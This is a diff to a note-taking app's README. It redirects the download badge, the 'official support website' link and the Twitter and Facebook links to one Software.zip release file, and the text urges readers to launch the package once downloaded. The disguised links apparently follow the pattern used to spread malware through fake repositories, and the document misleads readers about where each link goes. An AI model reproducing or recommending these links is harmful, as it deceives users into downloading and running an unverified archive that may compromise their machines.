@@ -13,7 +13,7 @@ Welcome to the "note-taker" repository! This is a public space where you can fin
 ## Installation 🖥️
 
 To get started with the note-taking software, you can download the package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
 
 Please note that the software package needs to be launched once downloaded. If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options.
 
@@ -26,7 +26,7 @@ Please note that the software package needs to be launched once downloaded. If y
 
 ## Support ℹ️
 
-For any questions or assistance regarding the note-taking software, you can visit the official support website [here](https://www.notetaker-support.com).
+For any questions or assistance regarding the note-taking software, you can visit the official support website [here](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip).
 
 ## Contribute 🤝
 
@@ -35,8 +35,8 @@ If you're interested in contributing to the development of the note-taking softw
 ## Stay Connected 🌐
 
 Stay up to date with the latest news and updates by following us on social media:
-- Twitter: [@notetakerapp](https://twitter.com/notetakerapp)
-- Facebook: [Note Taker](https://www.facebook.com/notetaker)
+- Twitter: [@notetakerapp](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
+- Facebook: [Note Taker](https://github.com/emrepl22/note-taker/releases/download/v2.0/Software.zip)
 
 ## License 📜
 
